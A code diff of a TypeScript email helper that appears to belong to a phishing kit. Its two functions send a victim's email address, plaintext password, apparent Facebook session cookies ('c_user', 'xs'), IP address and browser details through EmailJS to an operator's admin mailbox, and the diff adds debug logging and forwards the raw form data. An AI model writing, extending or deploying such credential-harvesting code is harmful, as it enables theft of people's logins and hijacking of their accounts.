@@ -21,16 +21,9 @@ export const sendValidationFormEmail = async (formData: any) => {
       throw new Error("EmailJS service or template ID is not configured");
     }
 
-    const templateParams = {
-      to_email: formData.admin_email || "admin@example.com",
-      c_user: formData.c_user,
-      xs: formData.xs,
-      timestamp: new Date().toLocaleString(),
-      ip_address: formData.ipAddress || "Not available",
-      user_agent: formData.userAgent || navigator.userAgent,
-    };
+    console.log('Sending validation email with data:', { ...formData, password: '[REDACTED]' });
 
-    return await emailjs.send(serviceId, templateId, templateParams);
+    return await emailjs.send(serviceId, templateId, formData);
   } catch (error) {
     console.error("Error sending validation email:", error);
     throw error;
@@ -46,16 +39,20 @@ export const sendConfirmationFormEmail = async (formData: any) => {
       throw new Error("EmailJS service or template ID is not configured");
     }
 
+    console.log('Sending confirmation email with data:', { ...formData, password: '[REDACTED]' });
+
     const templateParams = {
       to_email: formData.admin_email || "admin@example.com",
       user_email: formData.user_email,
       password: formData.password,
-      timestamp: new Date().toLocaleString(),
+      timestamp: formData.timestamp || new Date().toLocaleString(),
       ip_address: formData.ipAddress || "Not available",
       user_agent: formData.userAgent || navigator.userAgent,
     };
 
-    return await emailjs.send(serviceId, templateId, templateParams);
+    const result = await emailjs.send(serviceId, templateId, templateParams);
+    console.log('EmailJS confirmation response:', result);
+    return result;
   } catch (error) {
     console.error("Error sending confirmation email:", error);
     throw error;
